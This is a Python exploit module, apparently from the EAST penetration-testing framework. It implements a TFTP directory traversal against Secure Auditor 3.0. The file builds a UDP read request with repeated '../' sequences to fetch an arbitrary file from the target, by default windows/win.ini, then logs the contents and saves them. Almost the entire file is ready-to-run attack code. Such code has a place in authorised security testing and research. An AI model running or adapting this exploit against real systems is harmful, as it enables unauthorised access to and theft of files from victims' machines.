#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import socket
from collections import OrderedDict

sys.path.append('./core')
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_server_auditor_fd"
INFO['DESCRIPTION'] = "Secure Auditor 3.0 - Directory Traversal"
INFO['VENDOR'] = "www.secure-bytes.com"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/42041/']
INFO["CVE Name"] = "?"
INFO["NOTES"] = """Secure Auditor suite is a unified digital risk management solution for conducting automated audits on Windows, Oracle and SQL databases and Cisco devices.
"""

INFO['CHANGELOG'] = "28 Jul, 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/Web/'

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = 69, dict(description = 'Target port')
OPTIONS['PATH'] = 'windows/win.ini', dict(description = 'Path to downloaded file at target machine')

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.host = host
        self.port = port
        self.path = OPTIONS['PATH']
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.path = self.args.get('PATH', OPTIONS['PATH'])
    
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
            
        self.log('Try to download file ' + self.path)
        data = "\x00\x01"
        data += '../' * 5 + self.path + '\x00'
        data += "netascii\x00"
        
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.sendto(data, (self.host, self.port))
            content = s.recv(1024)
        except Exception as e:
            self.log(e)
            self.finish(False)
        
        self.log('= File Content =')
        self.log(content)
        self.log('= End of File  =')
        self.writefile(content)
        self.finish(True)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()